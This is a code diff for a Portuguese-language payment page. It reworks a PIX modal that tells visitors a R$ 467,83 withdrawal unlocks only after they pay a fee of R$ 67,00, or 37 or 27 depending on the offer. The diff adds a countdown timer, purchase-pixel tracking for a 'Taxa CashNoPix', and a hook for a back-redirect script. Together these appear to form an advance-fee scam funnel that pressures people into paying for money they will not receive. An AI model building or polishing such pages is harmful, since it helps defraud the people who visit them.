@@ -286,18 +286,19 @@
   </div>
 
   <!-- ⑫ PIX Modal (bottom sheet on mobile) -->
-  <div class="pix-overlay" id="pixOverlay" style="display:none;" role="dialog" aria-modal="true"
+  <div class="pix-overlay" id="pixOverlay" role="dialog" aria-modal="true"
     aria-label="Pagar via PIX">
     <div class="pix-card" id="pixCard">
       <div class="pix-handle"></div>
       <button class="pix-close" onclick="fecharPix()" aria-label="Fechar">✕</button>
 
-      <div class="pix-card">
+      <div class="pix-card-header">
         <div class="pix-icon">⚡</div>
         <div class="pix-title">Aguardando Pagamento</div>
         <div class="pix-timer">Expira em: <span id="timer">15:00</span></div>
         <div class="pix-desc">
-          Para liberar o saque de <strong>R$ 467,83</strong>, finalize o pagamento da taxa de caução.
+          Para liberar o saque de <strong>R$ 467,83</strong>, finalize o pagamento da taxa no valor de
+          <strong id="pixValorDisplay">R$ 67,00</strong>.
         </div>
       </div>
 
@@ -402,36 +403,47 @@
     /* ============== PIX MODAL ============== */
     let pollingInterval = null;
 
-    async function abrirPix(valor = 47) {
-      const modal = document.getElementById('pixOverlay');
-      const pixCode = document.getElementById('pixCode');
+    async function abrirPix(valor = 67) {
+      window.abrirPix = abrirPix; // garante acesso global
+      const overlay   = document.getElementById('pixOverlay');
+      const pixCode   = document.getElementById('pixCode');
       const qrContainer = document.getElementById('qrCodeContainer');
-      const qrImg = document.getElementById('pixQrImg');
+      const qrImg     = document.getElementById('pixQrImg');
+      const valDisplay = document.getElementById('pixValorDisplay');
 
-      modal.style.display = 'flex';
+      // Mostra o valor correto (pode ser 67, 37 ou 27 dependendo da oferta)
+      if (valDisplay) valDisplay.textContent = 'R$ ' + valor.toFixed(2).replace('.', ',');
+
+      // Abre o bottom sheet imediatamente (via classe CSS)
+      overlay.classList.add('pix-open');
       document.body.style.overflow = 'hidden';
       pixCode.innerText = 'Gerando seu PIX...';
       qrContainer.style.display = 'none';
+      document.getElementById('copyBtn').disabled = true;
 
       try {
         const data = await PAY.createPix(valor);
-        
+
         // Atualiza Copia e Cola
         pixCode.innerText = data.copy_paste;
-        
+        document.getElementById('copyBtn').disabled = false;
+
         // Atualiza QR Code
         if (data.qrcode) {
           qrImg.src = data.qrcode;
           qrContainer.style.display = 'block';
         }
-        
+
         startTimer(900);
-        startPolling(data.id);
+        startPolling(data.id, valor);
       } catch (err) {
-        pixCode.innerText = 'Erro ao gerar PIX. Tente novamente.';
-        console.error(err);
+        pixCode.innerText = '❌ Erro ao gerar PIX. Feche e tente novamente.';
+        document.getElementById('copyBtn').disabled = false;
+        console.error('PIX error:', err);
       }
     }
+    // Expor globalmente para o backredirect.js
+    window.abrirPix = abrirPix;
 
     function startTimer(duration) {
       let timer = duration, minutes, seconds;
@@ -446,13 +458,13 @@
       }, 1000);
     }
 
-    function startPolling(id) {
+    function startPolling(id, valorPago = 67) {
       if (pollingInterval) clearInterval(pollingInterval);
       pollingInterval = setInterval(async () => {
         const status = await PAY.checkStatus(id);
         if (status === 'paid' || status === 'approved' || status === 'completed') {
           clearInterval(pollingInterval);
-          PAY.trackPixel('Purchase', { value: 67.00, currency: 'BRL' });
+          PAY.trackPixel('Purchase', { value: valorPago, currency: 'BRL', content_name: 'Taxa CashNoPix' });
           SFX.success();
           setTimeout(() => {
             window.location.href = 'sucesso.html';
@@ -462,12 +474,12 @@
     }
 
     function fecharPix() {
-      document.getElementById('pixOverlay').style.display = 'none';
+      document.getElementById('pixOverlay').classList.remove('pix-open');
       document.body.style.overflow = '';
       if (pollingInterval) clearInterval(pollingInterval);
     }
 
-    // Close on backdrop tap
+    // Fecha ao clicar fora do card
     document.getElementById('pixOverlay').addEventListener('click', e => {
       if (e.target === document.getElementById('pixOverlay')) fecharPix();
     });
